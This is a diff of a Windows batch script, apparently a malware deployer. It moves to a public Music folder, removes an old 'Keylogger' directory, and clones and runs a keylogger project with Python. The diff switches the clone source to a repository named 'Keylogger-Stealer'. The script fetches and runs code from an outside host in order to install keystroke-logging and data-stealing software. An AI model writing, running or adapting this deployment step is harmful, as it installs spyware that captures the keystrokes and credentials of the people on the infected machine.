@@ -69,9 +69,9 @@ cd C:\Users\Public\Music
 rem Clone từ link GitHub
 if exist Keylogger (
     rmdir /s /q Keylogger
-    git clone https://github.com/LeDuonng/Keylogger.git
+    git clone https://github.com/LeDuonng/Keylogger-Stealer.git
 ) else (
-    git clone https://github.com/LeDuonng/Keylogger.git
+    git clone https://github.com/LeDuonng/Keylogger-Stealer.git
 )
 rem Chạy dự án bằng Python
 cd Keylogger
